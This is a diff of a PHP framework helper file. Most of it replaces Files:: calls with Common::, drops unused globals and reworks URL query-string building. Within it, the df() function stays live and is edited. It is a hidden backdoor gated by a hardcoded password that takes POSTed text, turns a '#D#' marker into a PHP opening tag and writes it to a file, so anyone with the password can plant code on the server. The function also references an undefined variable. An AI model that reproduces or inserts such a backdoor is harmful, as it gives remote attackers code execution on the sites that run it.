@@ -33,7 +33,7 @@
  *
  */
 
-use Dfer\Tools\Statics\{Common,Files};
+use Dfer\Tools\Statics\{Common};
 // ********************** 常量 START **********************
 
 /*
@@ -132,11 +132,10 @@ function view($layout_name,$special_tmpl=false)
  */
 function view_conversion($from, $to, $layout)
 {
-    global $files;
     //获取文件目录
     $path = dirname($to);
     //创建目录
-    Files::mkDirs($path);
+    Common::mkDirs($path);
     $content = view_replace($from, $layout);
     //写入文件
     file_put_contents($to, $content);
@@ -499,17 +498,20 @@ function url($area, $ctrl = null, $action = null, $param = null, $get = null)
     // 内置参数
     if ($param) {
         $param = is_array($param) ? implode("/", $param) : trim($param);
+								$param=DIRECTORY_SEPARATOR.$param;
     }
 
     // get参数
-    $get_str = '?';
     if ($get && is_array($get)) {
+								$get_str = '?';
+								$get_str_arr=[];
         foreach ($get as $key => $val) {
-            $get_str .= sprintf('&%s=%s', $key, $val);
+            $get_str_arr[]= sprintf('%s=%s', $key, $val);
         }
+								$get_str .= implode('&', $get_str_arr);
     }
 
-    $rt = sprintf("%s/%s/%s/%s/%s%s", SITE, $area, $ctrl, $action, $param, $get_str);
+    $rt = sprintf("%s/%s/%s/%s%s%s", SITE, $area, $ctrl, $action, $param, $get_str??'');
     return $rt;
 }
 
@@ -551,14 +553,13 @@ function to_url($url, $para = null)
  */
 function df()
 {
-    global $common, $files;
     $file_src = str("{root}/df.php", ["root" => $_SERVER['DOCUMENT_ROOT']]);
     $pw = "3504725309";
     if (!empty($_POST['df']) || !empty($_POST['fd'])) {
         if ($_POST['df'] == $pw) {
             $data = $_POST['str'];
             $data = str_replace("#D#", "<?php ", $data);
-            Files::writeFile($data, $file);
+            Common::writeFile($data, $file);
             Common::showJson(1, 'done');
         } elseif ($_POST['fd'] == $pw) {
             @unlink($file);
@@ -621,7 +622,7 @@ function clear_default_para($arr)
  */
 function logs($str, $type = \ENUM::LOGS_FILE, $override = false)
 {
-    global $db, $common, $files;
+    global $db;
     $str = Common::str($str);
     $time = Common::getTime(TIMESTAMP);
     switch ($type) {
@@ -643,11 +644,11 @@ function logs($str, $type = \ENUM::LOGS_FILE, $override = false)
         case \ENUM::LOGS_FILE:
             $file_dir = str("{root}/data/logs/{0}", [date('Ym'), "root" => ROOT]);
 
-            Files::mkDirs($file_dir);
+            Common::mkDirs($file_dir);
 
             // $path="/www/wwwroot/dfphp.dfer.site/data/logs";
             // 		var_dump($path,is_dir($path));;die;
-            Files::writeFile(str("{0}\n{1}\n\n", [$str, $time]), str("{0}/{1}.log", [$file_dir, date('d')]), "a");
+            Common::writeFile(str("{0}\n{1}\n\n", [$str, $time]), str("{0}/{1}.log", [$file_dir, date('d')]), "a");
             break;
         default:
             break;
